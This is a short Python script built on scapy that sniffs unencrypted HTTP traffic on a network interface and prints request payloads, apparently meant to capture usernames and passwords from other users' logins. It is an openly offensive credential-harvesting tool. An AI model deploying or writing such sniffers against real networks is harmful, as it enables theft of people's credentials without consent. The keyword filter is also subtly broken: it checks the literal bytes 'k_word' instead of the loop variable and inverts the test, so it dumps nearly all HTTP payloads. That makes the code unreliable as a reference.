#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


# created by Wambugu
# 01-09-2022

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet, filter="port 80")


def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            words = ["username", "user", "uname", "login", "password", "pass"]
            for k_word in words:
                if b'k_word' in load: continue
                print(load)
                break


sniff("wlo1")
